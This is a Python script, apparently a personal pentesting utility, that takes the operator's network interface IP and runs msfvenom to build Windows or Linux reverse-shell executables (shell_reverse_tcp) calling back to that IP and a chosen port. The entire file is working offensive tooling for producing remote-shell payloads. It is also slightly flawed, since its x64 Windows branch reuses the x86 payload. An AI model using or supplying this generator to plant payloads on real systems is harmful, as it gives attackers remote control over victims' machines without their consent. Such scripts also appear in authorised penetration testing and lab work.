#!/usr/bin/python3
import netifaces as ni
import argparse
import os


class GenerateShell:
    def __init__(self, interface, output, os, arch, port):
        self.interface = interface
        self.output = output
        self.os = os
        self.arch = arch
        self.port = port

        ni.ifaddresses(self.interface)
        self.ip = ni.ifaddresses(self.interface)[ni.AF_INET][0]['addr']  # GET INTERFACE IP

    def generate_shell(self):
        if self.arch == "x86":
            if self.os == "windows":
                self.command = "msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} -f exe > {}".format(self.ip, self.port, self.output)
            elif self.os == "linux":
                self.command = "msfvenom -p linux/x86/shell_reverse_tcp LHOST={} LPORT={} -f elf > {}".format(self.ip, self.port, self.output)
            else:
                print("[!] {} is not a supported os type.".format(self.os))
        elif self.arch == "x64":
            if self.os == "windows":
                self.command = "msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} -f exe > {}".format(self.ip, self.port, self.output)
            elif self.os == "linux":
                self.command = "msfvenom -p linux/x64/shell_reverse_tcp LHOST={} LPORT={} -f elf > {}".format(self.ip, self.port, self.output)
            else:
                print("[!] {} is not a supported os type.".format(self.os))
        else:
            print("[!] {} is not a supported architecture type.".format(self.arch))

        print("[!] Running command : {} ...".format(self.command))
        os.system(self.command)
        print("[!] Command ran successfuly!")


if __name__ == "__main__":
    print("""
    ----------------------------------------------------------------------
        ____        __               ____      ____     _____            
       / __ \____  / /___ _____     /  _/___  / __/___ / ___/___  _____
      / / / / __ \/ / __ `/ __ \    / // __ \/ /_/ __ \\\__ \/ _ \/ ___/
     / /_/ / /_/ / / /_/ / / / /  _/ // / / / __/ /_/ /__/ /  __/ /__  
    /_____/\____/_/\__,_/_/ /_/  /___/_/ /_/_/  \____/____/\___/\___/  


            Msfvenom Shell Generator
            Made By : Kyand
    -----------------------------------------------------------------------
        """)
    parser = argparse.ArgumentParser(description="RevShell generator")
    parser.add_argument('-i', '--interface', type=str, metavar='tun0', required=True,
                        help='Interface to create rev shell on')
    parser.add_argument('-o', '--output', type=str, metavar='rev.elf', required=True,
                        help='Output file')
    parser.add_argument('--os', type=str, metavar='linux', required=True,
                        help='Payload target os (either windows or linux)')
    parser.add_argument('--arch', type=str, metavar='x86', required=True,
                        help='Payload architecture (x86 or x64)')
    parser.add_argument('-p', '--port', type=str, metavar='53', required=True,
                        help='Port to be used in payload')
    args = parser.parse_args()
    creator = GenerateShell(args.interface, args.output, args.os, args.arch, args.port)
    creator.generate_shell()
